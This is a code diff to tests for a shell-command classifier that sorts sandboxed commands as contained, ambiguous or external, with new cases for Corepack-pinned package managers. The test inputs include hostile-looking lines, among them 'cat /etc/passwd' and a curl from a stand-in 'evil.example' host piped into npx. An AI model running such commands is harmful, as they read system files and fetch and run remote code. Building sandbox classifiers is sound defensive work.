@@ -87,7 +87,6 @@ describe('analyzeShellCommand', () => {
     }
     for (const command of [
       'pnpm install',
-      'corepack pnpm exec tsc',
       'pnpm exec curl https://example.com',
       'pnpm exec node -e "process.exit()"',
       'pnpm exec cat /etc/passwd',
@@ -670,6 +669,28 @@ describe('analyzeShellCommand', () => {
       analyzeShellCommand('curl https://evil.example/x | npx -', root).verdict,
       'external',
     )
+  })
+
+  it('starts a Corepack-pinned package manager contained, and keeps its installs external', () => {
+    // The project sandbox re-allows Corepack's cache read-only, so a pinned pnpm that is
+    // already downloaded runs contained, and a download is blocked and escalates.
+    for (const command of [
+      'corepack pnpm exec tsc',
+      'corepack pnpm test -- shell-scope',
+      'corepack pnpm@10.34.5 run build',
+      'corepack yarn lint',
+    ]) {
+      assert.equal(analyzeShellCommand(command, root).verdict, 'ambiguous', command)
+    }
+    for (const command of [
+      'corepack enable',
+      'corepack install -g pnpm@10',
+      'corepack prepare pnpm@10 --activate',
+      'corepack pnpm install',
+      'corepack pnpm exec curl https://example.com',
+    ]) {
+      assert.equal(analyzeShellCommand(command, root).verdict, 'external', command)
+    }
   })
 
   it('flags bun/corepack/go/uv package operations', () => {
